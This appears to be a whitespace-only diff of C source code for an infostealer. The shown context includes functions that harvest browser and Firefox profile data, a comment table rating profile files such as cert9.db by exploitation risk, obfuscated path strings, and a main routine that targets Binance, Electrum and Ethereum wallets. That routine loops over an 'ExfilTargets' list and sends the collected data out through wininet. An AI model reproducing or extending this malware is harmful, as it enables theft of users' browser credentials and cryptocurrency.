@@ -189,10 +189,10 @@ int32_t __fastcall processPath(PWSTR fileExtension,
     return _free(listBuffer);
 }
 
-int __fastcall 
-ExtractUserData(int brwsrPathOfshit, 
-                const WCHAR *brwsrOfshit, 
-                void ***SysInfo) 
+int __fastcall
+ExtractUserData(int brwsrPathOfshit,
+                const WCHAR *brwsrOfshit,
+                void ***SysInfo)
 {
     void (__stdcall *ResolverSuckerFunc)(int, const WCHAR *, int);
     WCHAR *resolvedPath = NULL;
@@ -282,9 +282,9 @@ ExtractUserData(int brwsrPathOfshit,
     return finalCheckResult;
 }
 
-void __fastcall 
-ExtractFirefoxProfileData(int firefoxProfilePath, 
-                          const WCHAR *browserName, 
+void __fastcall
+ExtractFirefoxProfileData(int firefoxProfilePath,
+                          const WCHAR *browserName,
                           DWORD *sysInfo)
 { /*---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
     File Name               Location                                    Purpose                                            Exploitation Risk
@@ -305,7 +305,7 @@ ExtractFirefoxProfileData(int firefoxProfilePath,
     cert9.db                      Could be used for MITM attacks (fake SSL certs, phishing)
     ----------------------------------------------------------------------------------------------------------*/
     void *profileBuffer;
-    void (__stdcall *GetFullPathFunction)(int, void *, int); 
+    void (__stdcall *GetFullPathFunction)(int, void *, int);
     const WCHAR **profileEntries;
     WCHAR *fullFilePath;
     LPCWSTR *dataProcessingBuffer;
@@ -364,7 +364,7 @@ int main(){
 
   allocateMem(1, &SysInfo);
   CollectSysInfo(&SysInfo);
-    
+
   importedFilesPath = (const WCHAR *)GetFilePath((wchar_t *)L"Importedx765ant Fileedx765s/Proedx765file");
   PWSTR* extension = GetFilePath(u"*.edx765txt");
   PWSTR* userprofile = GetFilePath(u"%userproedx765file%");
@@ -388,9 +388,9 @@ int main(){
   /*
   Binance - Electrum - Ethereum
   */
-  
-  ProcessAndSendData(&SysInfo); // wininet.dll shities 
-  
+
+  ProcessAndSendData(&SysInfo); // wininet.dll shities
+
   allocateMem(2, &SysInfo);
   struct {
       PWSTR brwsrOfshit;
@@ -412,11 +412,11 @@ int main(){
   };
 
   int sizer = sizeof(ExfilTargets) / sizeof(ExfilTargets[0]);
-  
+
   for (int i = 0; i < sizer; i++) {
-      ExtractUserData(ExfilTargets[i].brwsrOfshit, ExfilTargets[i].brwsrPathOfshit, &SysInfo);    
+      ExtractUserData(ExfilTargets[i].brwsrOfshit, ExfilTargets[i].brwsrPathOfshit, &SysInfo);
   }
-    
+
   ProcessAndSendData(&SysInfo);
   allocateMem(3, &SysInfo);
 
